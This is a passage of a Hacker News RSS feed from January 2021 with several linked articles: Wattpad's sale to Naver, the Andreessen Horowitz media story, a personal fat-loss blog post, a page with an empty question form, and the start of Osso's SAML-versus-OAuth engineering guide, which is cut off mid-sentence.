Kubernetes cluster to explore concepts of distributed systems, create proof of concept prototypes, and deploy self-hosted services on-premises or at the edge with almost zero recurring costs.</p><p>Yes, we believe that compact clusters and edge computing is a great fit. Compact clusters could be great building blocks for edge infrastructure. It’s easy to scale within one mini cluster and within the whole fleet of clusters. Different cluster nodes intended for different type of applications, which is a more reliable and efficient way to run services. At the same time container orchestration tools like Kubernetes makes it easy to monitor, maintain and deliver software.</p></div></div>]]>
            </description>
            <link>https://turingpi.com/are-compact-clusters-the-future-of-edge-computing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25842295</guid>
            <pubDate>Wed, 20 Jan 2021 03:31:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Rent a Brain]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25842092">thread link</a>) | @pyeargin
<br/>
January 19, 2021 | https://thesageboard.com/ask-question | <a href="https://web.archive.org/web/*/https://thesageboard.com/ask-question">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            
            <div>
                <p><span>Note:</span><br>
                Please note that both public and private questions start here. Create your question, apply formatting options to enhance readability, attach files or embed images, tag your post, and choose whether to publish to public forums or send to a Sage for 1 on 1 advice.</p>
            </div>
            <div>
                <div>
                    <div>
                        <p><h2>Ask Question</h2></p>
                        <div>
                            <form action="https://thesageboard.com/ask-question" method="POST" id="questionForm" enctype="multipart/form-data">
                                                                <div>
                                    <p>
                                        <label>Question Title<span>*</span></label>
                                        
                                                                                <span>Please choose a descriptive and appropriate title to help others answer your question easier.</span>
                                    </p>
                                    <div>
                                            <p><label for="select-topic">Select Topic<span>*</span></label>
                                                
                                            </p>
                                            <p><label for="select-subtopic">Select SubTopic</label>
                                                
                                            </p>
                                        </div>
                                    
                                    <p><label>Attachment</label></p>
                                    
                                    
                                    <p>
                                        <label>Tags</label>
                                        
                                                                                <span>Please choose  suitable Keywords Ex : <span>question , poll</span> . Maximum 5 tags allowed.</span>
                                        </p>
                                    
                                </div>
                                                                    <div>
                                        <div>
                                            <p>You must be logged in to Ask Question</p>
                                            
                                            
                                            
                                        </div>
                                    </div>
                                                            </form>
                        </div>

                    </div><!-- End page-content -->
                </div>
                
            </div>
    </section></div>]]>
            </description>
            <link>https://thesageboard.com/ask-question</link>
            <guid isPermaLink="false">hacker-news-small-sites-25842092</guid>
            <pubDate>Wed, 20 Jan 2021 02:57:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Wattpad to be sold to South Korean internet giant for $600M US]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25841311">thread link</a>) | @andrewdutton
<br/>
January 19, 2021 | https://www.cbc.ca/news/business/wattpad-sold-south-korean-giant-1.5879865 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/business/wattpad-sold-south-korean-giant-1.5879865">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>One of Canada's most prominent technology darlings is being sold to a South Korean internet conglomerate in a $600 million US deal.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5879876.1611103579!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/473053686.jpg"></p></div><figcaption>Wattpad co-founder Allen Lau, pictured here in 2015, said the sale of the Toronto-based online storytelling company is an opportunity for further growth.<!-- --> <!-- -->(Brad Barket/Wired/Getty Images)</figcaption></figure><p><span><p>One of Canada's most prominent technology darlings is being sold to a South Korean internet conglomerate in a $600 million US deal.</p>  <p>Toronto-based online storytelling company Wattpad&nbsp;said its board of directors unanimously approved a cash and stock transaction Tuesday that will see it acquired by Naver later this year. The company will retain its Canadian headquarters.</p>  <p>"This is the most important day in the history of the company and an incredible milestone," said Allen Lau, one of Wattpad's co-founders, in an interview.</p>  <p>"It is the beginning of a new chapter and using TV show terminology, this is episode one of season two, so I'm absolutely looking forward to this."</p>    <p>Lau and Ivan Yuen, who will continue to lead Wattpad following the sale, started the self-publishing platform after the pair dreamed up the idea on a napkin while waiting for a flight at the Vancouver airport food court in 2006.</p>  <p>Wattpad quickly became home to stories from dozens of genres because it allows anyone to share their writing for free and is accessible on phones and tablets.</p>  <p>It became a household name around 2013 when Anna Todd, a Texas woman, started writing <em>After</em>,&nbsp;a fanfiction series on the platform about One Direction singer Harry Styles.</p>  <p>Her stories were eventually made into books and a film series, which encouraged Wattpad to start book publishing and studio entertainment divisions.</p>  <p>However, Lau admitted a sale wasn't always his plan.</p>  <p>"We weren't actively looking for sellers, but we have been talking to investors along the way …&nbsp;to accelerate our growth," he said.</p>  <p>"We knew Naver for quite some time and we realized after some conversations we have a shared vision."</p>  <h2>Opportunity to grow, get into animation, co-founder says</h2>  <p>Naver, which bills itself as "South Korea's largest web search engine," was an ideal partner because it owns digital comics platform Webtoon, he said.</p>  <p>Webtoon is behind some of the biggest names in webcomics, including <em>Lore Olympus</em>,&nbsp;and has worked with the Jim Henson Company and producers behind hit films like <em>The Lego Movie</em>, the <em>It&nbsp;</em>franchise and <em>Snowpiercer</em>.</p>  <p>Lau said Naver will offer Wattpad a chance to get into animation and to grow beyond the 90 million users — including more than five million writers — that Wattpad has. Webtoon said it has more than 72 million monthly active users.</p>  <p>"Wattpad's vision to entertain and connect the world through stories fits perfectly with our vision for Webtoon and Naver's content brand and we're thrilled to have them join the Naver family," Seong-sook Han, chief executive, said in a statement.</p>    <p>The acquisition is expected to close in the second quarter of Wattpad's fiscal year and is subject to regulatory approvals.</p>  <p>It is the latest in a string of sales that have seen once-promising Canadian tech companies snatched up by foreign owners during the COVID-19 pandemic.</p>  <p>Element AI, a Montreal-based firm that creates artificial intelligence solutions for large organizations, signed a deal in November to be purchased by ServiceNow, a Santa Clara, Calif., company that offers a cloud-based workflow technology.</p>  <p>San Francisco-based "buy now, pay later" company Affirm reached a deal to buy Toronto rival PayBright for $340 million in early December.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/business/wattpad-sold-south-korean-giant-1.5879865</link>
            <guid isPermaLink="false">hacker-news-small-sites-25841311</guid>
            <pubDate>Wed, 20 Jan 2021 01:08:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Unauthorized Story of Andreessen Horowitz]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25841263">thread link</a>) | @DLay
<br/>
January 19, 2021 | https://www.newcomer.co/p/the-unauthorized-story-of-andreessen | <a href="https://web.archive.org/web/*/https://www.newcomer.co/p/the-unauthorized-story-of-andreessen">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F808c0f60-f287-48aa-a1d2-8cac89b2d775_2925x2024.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F808c0f60-f287-48aa-a1d2-8cac89b2d775_2925x2024.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/808c0f60-f287-48aa-a1d2-8cac89b2d775_2925x2024.jpeg&quot;,&quot;height&quot;:1008,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1495938,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p><strong>Benedict Evans</strong>, Andreessen Horowitz’s former in-house analyst, has <a href="https://twitter.com/benedictevans/status/651587754938118144">mused</a> over the <a href="https://twitter.com/benedictevans/status/869685056196956160?s=20&amp;fbclid=IwAR1AOJf8nkKJbP3nN5CSonf2yjp-eiDf4Plpd8EqOgD9oecQEmmXqSJOUQo">years</a> that “A16Z is a media company that monetizes through VC.”</p><p>That observation becomes truer by the day. </p><p>While there’s a lot of loose talk on Twitter about cutting out the media and “going direct” – publishing your own story to the world without the press as an intermediary – Andreessen Horowitz is really doing it, consciously and methodically. The firm’s strategy has dramatic implications for the future of media and the venture capital industry. </p><p>This is the story of how Andreessen Horowitz disrupted the world of venture capital by cozying up to the media and then, how they purposefully threw that relationship away.</p><p>Let me tell you the story from the beginning.</p><p>About a decade ago, <strong>Margit Wennmachers</strong> sent an email to reporter <strong>Kara Swisher</strong>. </p><p>Swisher took a break from horseback riding to <a href="http://allthingsd.com/20100614/outcasts-wennmachers-joins-andreessen-horowitz-as-partner/">write that Wennmachers was leaving Outcast</a>, the communications agency she co-founded with <strong>Caryn Marooney</strong>. Wennmachers was joining the one-year-old venture capital firm Andreessen Horowitz as a full partner – a rare title for a woman in Silicon Valley, especially in 2010.</p><p>Wennmachers explained her strategy for positioning the firm in the early days, <a href="https://a16z.com/2019/11/20/brand-building-a16z-ideas-people-marketing/">in an interview</a> on Andreessen Horowitz’s in-house podcast. “I wanted to try and get a cover story because – this sounds old fashioned now, because everybody reads their news on Twitter and it's all online whatever – but there's still a statement that comes with a cover story that is in print, that you see at the airport,” she recalled. </p><p>With Wennmachers’ press savvy, <strong>Marc Andreessen</strong>’s idea-a-second patter, and <strong>Ben Horowitz</strong>’s gravitas, the trio took Silicon Valley by storm. The firm outbid competitors for sought-after companies, spun up a slew of services for founders, and pitched its story relentlessly to the press.</p><p>With Wennmachers’ encouragement Andreessen penned a now <a href="https://www.wsj.com/articles/SB10001424053111903480904576512250915629460">historic Op-Ed</a> in the <em>Wall Street Journal</em> in 2011, titled, “Why Software is Eating the World.” The phrase became so ubiquitous that it can seem like everything eats the world these days. </p><p>“Margit is really a hidden founder of this firm,” a startup founder who has raised money from the firm told me. “The power dynamics there is, Marc, Ben, and Margit.” </p><p>Communications executives and reporters alike are in awe of Wennmachers for her sway with the media. “Comms in the Valley – she's the number 1 draft pick. She's very good,” one public relations person said. “I would never want to be crosswise with her.” </p><p>While Wennmachers’ strategy in that early period would have been familiar to many in Hollywood and Washington, it was less common in clubby and decorous Silicon Valley at the time. “She would say that was her job – to manage information so that she could shape the narrative,” one person who knows Wennmachers said. </p><p>Wennmachers deployed industry gossip and access to her firm’s partners to stay in the good favor of many reporters. </p><p>One communications executive at an Andreessen Horowitz portfolio company recalled Wennmachers fishing for information about an upcoming story on behalf of reporters. Wennmachers pushed to deliver the information to the reporters herself, this executive said. </p><p>A high-powered rival PR executive described Wennmachers as an enforcer: “<em>You don't cross us and if you do, we shut off the information flow.</em>”</p><p>One member of the press recalled Wennmachers chasing down a potential bit of news. When Wennmachers returned the call and threw cold water on the story, the reporter took it in stride. Wennmachers told the reporter that they were now a “friend of the firm.” The comment struck the reporter as odd. They were just trying to get the facts right. But Wennmachers’ attitude seemed to reflect a coziness that she had come to expect from reporters dutifully covering Silicon Valley. </p><p>Wennmachers regularly hosted salon-style dinners at her home near the Presidio in San Francisco with reporters, portfolio companies, and the firm’s partners. While it’s not unusual for a venture capital firm to host reporters for a dinner, Wennmachers did it better than anyone else. When I attended one of her dinners in 2014, it felt like I’d finally gotten invited inside the Silicon Valley. &nbsp;</p><p>“I was invited to dinner at her house with members of the media. It was incredible,” one founder recalled. “That was like a cool invitation. If you were in the press you were really excited about getting dinner at Margit’s house, which is kind of mind-blowing if you think about it.” </p><p>Wennmachers can put on a friendly façade, but if you spend much time with her you come to realize that she’s a profoundly serious person. She doesn’t win over reporters because she’s fun. It’s because she cuts through the bullshit. She fundamentally understands what makes a good story. She knows what motivates reporters better than many reporters. That’s part of what makes the firm’s turn against the media so worrying.</p><p>Back in that early media heyday, Wennmachers doled the firm’s partners out to media companies who were eager to have them speak at lucrative conferences. And the firm’s partners were game to prophesize in audacious terms about what the future might look like, filling column inches.</p><p>Swisher and Wennmachers – two women who climbed their way to dominance in an industry overrun with men – are friendly to this day. Many Silicon Valley insiders strongly suspect that Wennmachers was one of Swisher’s sources when she covered Silicon Valley’s day-to-day dramas. But Swisher describes Wennmachers as fiercely loyal to her own companies, though Wennmachers “also did not pretend a problem I might call about was not one.” </p><p>Marc Andreessen himself had a cozy relationship with reporters like Swisher. "Marc is fully in charge of his own communications and has over time stopped wanting to deal with the press for lots of reasons, including some mistakes he made.” </p><p>From 2009 through 2015, Andreessen Horowitz earned a run of truly phenomenal press coverage, catapulting itself into the very top echelon of venture capital firms – at least based on its reputation. The media loved that bald headed internet geek and his gruff business guru sidekick. And over cocktails or lunch at the Battery, reporters probed Wennmachers for information, even if she rarely earned a mention in their stories. </p><p>Then the magazine writer <strong>Tad Friend </strong>pitched a profile of Marc Andreessen for the <em>New Yorker</em>. Wennmachers already saw the firm’s position in the popular consciousness beginning to shift. The firm was no longer an exciting upstart. “At that point I was at a stage where it was like ‘enough.’ ‘We're done talking about ourselves,’” Wennmachers said in the podcast interview. On the other hand, she reasoned, “The <em>New Yorker</em> is the <em>New Yorker</em>, so how often is the <em>New Yorker</em> going to write the definitive piece on venture capital? Once in a decade? Maybe? Well, do I want that to be about whoever or do I want that to be about us? At that point, I want to occupy that spot?” </p><p>She decided to do the story – though of course <em>she</em> wouldn’t occupy it. She merited a single passing mention. Marc Andreessen’s shiny head was the focus instead.</p><p>The story ran in May 2015, with the title, “<a href="https://www.newyorker.com/magazine/2015/05/18/tomorrows-advance-man">Tomorrow’s Advance Man</a>.” The glowing portrait instantly became one of the seminal stories on the venture capital industry.</p><p>Despite running more than 10,000 words, the article made a single passing mention of one of Andreessen Horowitz’s most important investments, Zenefits. The firm had backed up the truck to invest in <strong>Parker Conrad’s</strong> human resources software company and hyped it in the press. But cracks had started to appear. By the end of 2015, Buzzfeed reporter <strong>Will Alden</strong> had planted the seeds of Zenefit’s unraveling, raising questions about whether the company’s health insurance brokers were properly licensed. </p><p>That same year, John Carreyrou revealed that Theranos had “<a href="https://www.wsj.com/articles/theranos-has-struggled-with-blood-tests-1444881901">struggled with its blood testing technology</a>.” Theranos had mostly raised money outside of Silicon Valley. But some venture capitalists tied their reputations to defending the company anyway. Marc Andreessen, who tweeted prolifically at the time, appeared to develop an affinity for blocking people who tweeted negatively about Theranos. </p><p>For reporters – and especially their editors – the Theranos story was a sign that tech reporters needed to take a more critical eye towards the startups they covered. Carreyrou was an investigative reporter, not on the Silicon Valley beat at all. Tech reporters shouldn’t have missed Theranos’s shortcomings. So, they redoubled their efforts.</p><p>Then, indeed, Andreessen Horowitz found itself with a troubled portfolio company of its own. In May 2016, I reported<a href="https://www.bloomberg.com/features/2016-zenefits/?sref=WS92jZg5"> in Businessweek</a> about Zenefit’s self-disruption. Many other tech reporters also dug into the company’s failings.  </p><p>Behind the scenes, <strong>Kim Milosevich</strong>, then Wennmachers’ top lieutenant, went to task pointing much of the blame for the company’s implosion on its co-founder <strong>Parker Conrad</strong> – who certainly deserved a big portion of the credit for the company’s problems. </p><p>But Andreessen Horowitz partner <strong>Lars Dalgaard</strong> had cheered Conrad on, telling Conrad to double the company’s revenue growth target, I reported back then. Zenefits was the company Andreessen Horowitz wanted to grow, grow, grow. Years earlier, Ben Horowitz himself had <a href="https://a16z.com/2010/03/17/the-case-for-the-fat-startup/">penned an essay</a> making the case for “fat startups,” ones that spend aggressively to block out their competitors. Zenefits seemed to be running that playbook. </p><p>But as the company’s business started to falter and with mounting regulatory risk, Horowitz stepped in to help push Conrad to step aside. The firm laid the blame at Conrad’s feet. And <strong>David Sacks</strong>, who had been the company’s chief operating officer, was sold to the world as a turnaround CEO. </p><p>That same year, the press started to turn its attention to Andreessen Horowitz itself, wondering if this firm really lived up to all the hype we’d been fed over the years. </p><p>My occasional bridge partner, <em>Wall Street Journal</em> reporter <strong>Rolfe Winkler</strong>, wrote in …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.newcomer.co/p/the-unauthorized-story-of-andreessen">https://www.newcomer.co/p/the-unauthorized-story-of-andreessen</a></em></p>]]>
            </description>
            <link>https://www.newcomer.co/p/the-unauthorized-story-of-andreessen</link>
            <guid isPermaLink="false">hacker-news-small-sites-25841263</guid>
            <pubDate>Wed, 20 Jan 2021 01:03:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[And I’m still a fat b*st*rd]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25840825">thread link</a>) | @rosiesherry
<br/>
January 19, 2021 | https://www.grahamsherry.com/2020/01/11/an-abundance-of-caring/ | <a href="https://web.archive.org/web/*/https://www.grahamsherry.com/2020/01/11/an-abundance-of-caring/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post started as a few simple sentences for my brother; tips on how to lose fat and manage blood sugar better. I decided to write them down as a reminder to myself, or anyone, especially those in middle age, as I’m starting the year with a health drive.</p>

<p>The golden triad is simple: <em>optimise your sleep, diet and activeness.</em></p>

<p>Consider this as 10 years of research simplified into a blog post. If knowledge was the answer we’d all be millionaires with six pack abs – lifestyle change is the only way.</p>

<p>Setting up for success: I recommend a few links throughout this, before reading I’d start with: <a href="https://youtu.be/qHUFgFYdJck" target="_blank" rel="noopener noreferrer">Behaviour/Environment Design</a></p>

<blockquote>
  <p>“Your diet is not only what you eat.</p>

  <p>It is what you watch, what you listen to, what you read, the people you hang around.</p>

  <p>Be mindful of the things you put into your body emotionally, spiritually and physically.”</p>
</blockquote>


<p>This one is fairly obvious, simply put, sleep restores body and mind, so try to improve your quality of sleep.</p>

<p>Also, sometimes we think we’re hungry when were really tired.</p>

<p>The book: Why We Sleep by Mathew Walker  <br>
The hack:  Try and sleep 8 hours every night, ideally at the same time, even on weekends. Don’t drink caffeine after midday. Avoid alcohol? <a href="https://youtu.be/EOaSWPROOxw" target="_blank" rel="noopener noreferrer">Five tips</a></p>


<p>I’ve always had success shedding a few pounds following the Slow Carb Diet; evolved or created by Tim Ferriss in The Four Hour Body. This is my go-to approach, as a bonus I also truly feel it’s <em>anti-inflammatory</em> effects.</p>

<p><em>I like it because at it’s core it’s about simplicity, no white food (bread/rice/pasta), no processed food (i.e. no sugar), so it really encourages you to eat home cooked <strong>whole foods</strong>.</em></p>

<p>There is a tonne of information online about what is involved:</p>

<p>A <a href="http://www.williamhertling.com/2011/02/4-hour-body-fat-loss-cheat-sheet_27/" target="_blank" rel="noopener noreferrer">cheat sheet</a> or an <a href="http://www.fitnessinfographics.com/diets-4-hour-body-slow-carb/" target="_blank" rel="noopener noreferrer">infograhic</a>.</p>

<p>I also believe in the health benefits of Time Restricted Feeding; due to a book called The Circadian Code, here’s an excellent intro/overview by the author: <a href="https://youtu.be/t0NI0jELuF4" target="_blank" rel="noopener noreferrer">Dr. Satchin Panda - Daily Rythms</a></p>

<blockquote>
  <p>“Lifestyle is what, WHEN and how much we Eat, Sleep, and Move on a daily basis.”</p>
</blockquote>

<p>My preference is to exercise/workout, or go for a walk, in the morning, before eating. I will drink water or black coffee, then tend to start eating around midday, I try not to eat at night (after 9:30). Meaning a 9-10 hour feeding window, giving my digestion a break. If an option, I would also swim and sauna in the evening.</p>

<p>I think calorie density/food satiety (feeling full) can play there parts (for example, eating enough so as not to snack, or starting meals with soups or veggies/salads): <a href="https://youtu.be/0CdwWliv7Hg" target="_blank" rel="noopener noreferrer">Calorie Density: How To Eat More, Weigh Less and Live Longer</a></p>

<p>The hack:</p>
<ul>
  <li>whenever you break fast, start with a slow carb/high protein meal.</li>
  <li>Hydrate (2 litres water per day), don’t drink calories and have a day off (cheat day).</li>
  <li>Take pictures on your phone of everything you put in your mouth (for a week).</li>
  <li>Or log everything in myfitnesspal. (what gets measured gets managed).</li>
</ul>


<p>A complex and debatable topic, as there are many variables; types of exercise, what we can sustain/enjoy, our age, our ability to recover, etc.</p>

<p><em>For this goal, the idea is simple, do activities that keep our metabolism in fat burning mode</em>.</p>

<p>I believe we’re burning fat when in a calorie deficit (consuming less calories than we use). Muscle is denser/heavier than fat, building muscle means we use more calories to move, which means burning fat (our goal). Also, as we age we suffer from muscle atrophy (loss), so if we don’t build new muscle, we’re getting slowly weaker. “Use it or lose it, baby!”</p>

<p>As the saying goes, you can’t outrun a bad diet. Whilst running/swimming/cycling/yoga/pilates are great exercise for our health/heart/cardio, it isn’t the optimum way to burn fat, as they don’t build as much muscle.</p>

<p>Lifting weights, which also stimulates the heart and builds muscle, includes lifting our own bodyweight, so we can start with simple push-up/pull-ups, air squats, then perhaps progress to kettlebells/dumbbells. High Intensity Interval Training is an excellent way to kickstart the metabolism and continue fat burning for a few hours (some call it the afterburn effect), but this is probably true of many exercises.</p>

<p>Here is an example of a quick/light HIIT circuit/session using weights (time-lapse, 45 sec each exercise, 15 sec rest, x3 rounds): <a href="https://youtu.be/jdV_td3OJg4" target="_blank" rel="noopener noreferrer">HIIT session</a></p>

<p>Also, walking is an excellent recovery tool, great to keep the fire going and burn calories…</p>

<p>Ideally, in time, we would combine compound strength training (e.g. squats/deadlifts, to stop muscle atrophy) with some weighted HIIT classes (2-3 x per week), then some other general recovery exercises throughout the week (like walking/swimming).</p>

<p>N.B. An important point to remember is to fuel our body correctly, to optimise the benefits of whatever type of training protocol we follow. I try to balance this a slow carb (25%), medium fat(40%), high protein(35%), if possible.</p>

<p>The hack:</p>
<ul>
  <li>do as many wall push-ups, pull-ups (start on a chair), air squats, just before and 90 mins after meals, as you can (consider <a href="https://www.google.co.uk/search?&amp;q=negative+pull+ups" target="_blank" rel="noopener noreferrer">progressions</a>)</li>
  <li>Replace car journeys with walking or cycling (great for the bank balance too)</li>
</ul>


<p>Putting on fat doesn’t happen overnight, neither does fat loss, or composition changes. Consistency over the long term is the key.  If you crack and have a tasty treat, or a day off exercise, make sure to enjoy it and start over the next day. James Clear has an excellent mindset/approach “I try to never miss two in a row”.</p>

<p>It’s not all about what you put in your mouth, keep active, and sleep well. Remember, losing anything from 1-2 pounds of fat per week really is winning.</p>

<p>The book(s): The Slight Edge/Atomic Habits  <br>
The hack: Simple, small and satisfying daily positive choices that move you in the right direction. Picture yourself winning, try to track how often you are choosing to take that action/behaviour, and enjoy all the small wins.</p>

<p>Albert Einstein is reputed to have said:</p>
<blockquote>
  <p>“Compound interest is the eighth wonder of the world. He who understands it, earns it; he who doesn’t, pays it.”</p>
</blockquote>

<p><em>And I’m still a fat b*st*rd</em>…</p>

<p>#anabundanceofcaring</p>

  </div>

</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://www.grahamsherry.com/2020/01/11/an-abundance-of-caring/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25840825</guid>
            <pubDate>Wed, 20 Jan 2021 00:09:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SAML vs. OAuth]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25840413">thread link</a>) | @nagums
<br/>
January 19, 2021 | https://ossoapp.com/blog/saml-vs-oauth | <a href="https://web.archive.org/web/*/https://ossoapp.com/blog/saml-vs-oauth">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><h3>An Engineer’s Guide to Enterprise-grade Single Sign-on<a href="#an-engineers-guide-to-enterprise-grade-single-sign-on" title="Direct link to heading">#</a></h3><p>OAuth and <a href="https://ossoapp.com/blog/what-is-saml">SAML</a> are both open specifications for exchanging access credentials for a specific user between an identity provider and an application. When a user wants to sign in to an app using either SAML or OAuth, they are sent to a third party where the user must already be registered. They sign in to this third party, and get sent back to the application. The mechanisms differ, but both SAML and OAuth involve using secrets to securely exchange information about the user in order for the application to begin an authenticated session for the user.</p><p>If you’re approaching these technologies as an engineer, you can consider OAuth to be <em>class based</em> while SAML is <em>instance based</em>. With OAuth, you configure your application with a provider like GitHub, and any GitHub user can now sign in to your app. But with SAML, you must configure your application with an Identity Provider (IDP) <em>instance</em>. Each customer who wants to use SAML will have an instance with their IDP, and you and the customer must perform a configuration between your app and their IDP instance. </p><p>While this might seem like a small distinction for SAML vs. OAuth, as you pull on the instance thread, you begin to understand implementing SAML to be a much bigger project than implementing OAuth - it needs CRUD and persistence, a UI to configure instances, and documentation for your customers and teammates, and you’ll need to adjust how your sign-in form works. These knock on effects are way more important to think about than the nitty gritty details of SAML — like most things in modern web dev, really strong libraries exist for the nitty gritty, but they only get you 90% of the way there when building a production-ready integration.</p><h3>An abridged and personal history of OAuth<a href="#an-abridged-and-personal-history-of-oauth" title="Direct link to heading">#</a></h3><p>I started programming for the web right in the midst of the “social web 2.0” era and OAuth was <em>everywhere</em>. It was the heyday of hackathons, a more fun and flippant wacky Internet, where OAuth both helped you get up and running quicker, bypassing password based auth, and also gave you a wealth of users’ data to mix and match and create experiences with - Facebook friends, Foursquare checkins and Tweets…at least when the fail whale was kept at bay.</p><p>OAuth was convenient for the average web user. It wasn’t necessarily designed as a way to authenticate your users, but folks started using it that way and never really looked back. Instead of remembering passwords for hundreds of websites, the average Internet user was happy to hand over keys to their Facebook account for the convenience of signing in with Facebook. Providers, consumer engineers and users eventually got smarter with scopes, limiting what an app could do on your behalf in the account you had OAuthed.</p><p>OAuth remains a popular authentication mechanism today, for both consumer and business applications. It’s incredibly easy to implement - languages and frameworks often have standardized approaches or libraries that make this easier. In Ruby, there’s <a href="https://github.com/omniauth/omniauth" target="_blank" rel="noopener noreferrer">omniauth</a>, “a library that standardizes multi-provider authentication for web applications”. Any developer can create an omniauth “strategy” for a specific web service. Passport is a similar approach for NodeJS apps.</p><p>You’ll typically register your application on the web service’s developer portal, where you’ll get a Client ID and Client Secret, specify redirect URIs and choose the scopes you want to use. Add these secrets to your application, drop in an OAuth library, and you’re done in less than an hour. OAuth is definitely convenient for users and engineers, but when it comes to large or security-focused enterprises, SAML is the best choice for them and their employees (even if it’s a headache to implement).</p><h3>Keeping CISOs up at night<a href="#keeping-cisos-up-at-night" title="Direct link to heading">#</a></h3><p>A Chief Information Security Officer is the person ultimately responsible for an organization's information and data security. A good way to shirk this responsibility would be to allow your employees to sign up for critical apps and services using a password or through OAuth against an identity provider that the enterprise doesn’t control. Consider an employee who is terminated, but signed in to all of their services using email and password or their personal Twitter account. </p><p>The IT department would need to ensure, right at the time of termination, that the employee’s access to services is cut off. They would need to go into the account settings for every service and remove that user. At enterprise scale, tens or hundreds of employees might leave in a given week. Managing account access would be a never-ending nightmare for the IT department.</p><h3>SAML locks it down<a href="#saml-locks-it-down" title="Direct link to heading">#</a></h3><p>Once again the SAML part is not really what matters here. Many IDPs support other technologies for exchanging credentials, including OAuth. But SAML is the standard that enterprises have adopted and is supported by every enterprise-grade Identity Provider. </p><p>The important aspect of enterprise-grade Identity Providers is that they centralize user access to applications. When an employee is terminated, the IT department can go to just one place where they remove the user, and the user immediately loses access to all of the services they used at work. SAML stands for “Secure Assertion Markup Language”, but in common usage, SAML is an authentication mechanism where an enterprise can easily shut off access. When an enterprise requires that you offer SAML authentication, it’s not because they love old clunky technologies or want to annoy you — they simply need to be able to manage employee access to services in a single place.</p><h3>SAML slows you down<a href="#saml-slows-you-down" title="Direct link to heading">#</a></h3><p>If you need to add SAML, that’s a great problem for your company to have! It means you’re moving up market and selling to bigger companies with a larger deal size and who tend to be a little stickier. If you’re thinking about adding SAML, you probably have 1,000 other things on your plate, from scaling concerns, to features you’ve wanted to add, and tech debt to address. But adding SAML might be the biggest single thing you could do to increase your company’s revenue, unlocking deals with bigger companies.</p><p>The problem is that it takes <em>a lot more work</em> to implement SAML vs. OAuth. It’s not exactly difficult work - you won’t need to write any algorithms, and lots of open source libraries exist for dealing with the actual SAML responses you receive from an IDP. But returning to our <em>class</em> vs. <em>instance</em> based distinction, lets review some tasks you’ll need to complete in order to ship a production-ready SAML integration.</p><h4>1. Configuration UI and CRUD<a href="#1-configuration-ui-and-crud" title="Direct link to heading">#</a></h4><p>Every SAML-needing customer will need to be onboarded, where a teammate will provide some information to your customer, like an Assertion Consumer Service URL and an Entity ID. These are part of the SAML spec, and going into detail about their functions is beyond the scope of this post, but know that your application will need to generate these values, unique to each customer. Once your customer configures your app in their IDP, they’ll return some data to you, often in the form of a metadata XML file. Will you parse this for the keys and SSO URL you need to persist? Or have your teammates open the XML and copy out the data? Either way you’ll need to persist it all in a database table, and have a reliable way to look it up when a user wants to log in.</p><h4>2. Documentation<a href="#2-documentation" title="Direct link to heading">#</a></h4><p>You can’t assume that your customer will know how to set up a SAML app in their IDP instance, so you’ll need to provide some instructions. That typically means signing up for all of the common IDPs, working your way through their documentation and configuring a test app, QAing with your codebase, and ultimately creating some sort of documentation to help your customers. Skip this at your peril - this will be the first thing your valuable enterprise customer experiences after signing a deal. </p><h4>3. Sign-in UX<a href="#3-sign-in-ux" title="Direct link to heading">#</a></h4><p>Since SAML authentication is instance based, you need to route users to the right IDP via the SSO URL your customer returned to you. Unlike OAuth, you can’t just stick a Sign in With Okta button on your login page and be done. The two common ways of approaching this are to either split your login form into two steps, first ascertaining email and sending to the IDP if the user belongs to an enterprise SAML account, or to create a second SAML SSO login form that only collects email or company domain.</p><p>That’s a lot of work! If you’re reading this, I think we can probably assume that your teammates in support don’t know what SAML is, so you’ll probably need some internal docs and training too. And we haven’t even gotten into the SAML spec itself! Attribute mapping, Single Log Out, there’s still more to think about here.</p><h3>Osso lets you treat SAML as OAuth<a href="#osso-lets-you-treat-saml-as-oauth" title="Direct link to heading">#</a></h3><p>You’ve probably implemented OAuth at some point in your career, you may 